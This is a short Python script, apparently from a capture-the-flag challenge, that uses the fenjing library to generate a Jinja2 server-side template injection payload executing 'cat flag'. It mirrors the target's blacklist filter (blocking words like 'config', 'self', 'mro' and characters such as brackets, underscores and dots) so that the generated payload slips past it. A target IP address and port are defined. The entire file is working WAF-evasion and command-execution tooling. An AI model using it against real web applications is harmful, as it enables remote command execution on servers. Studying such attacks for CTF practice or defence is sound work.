import functools
from fenjing import exec_cmd_payload

URL = "http://34.132.132.69:8006/"

@functools.lru_cache(1000)
def waf(s: str):
    blacklist = [
        "config", "self", "mro", "base",
        "[", "_", ".", "%", "+"
    ]
    return all(word not in s for word in blacklist)

if __name__ == "__main__":
    shell_payload, _ = exec_cmd_payload(waf, "cat flag")
    print(shell_payload)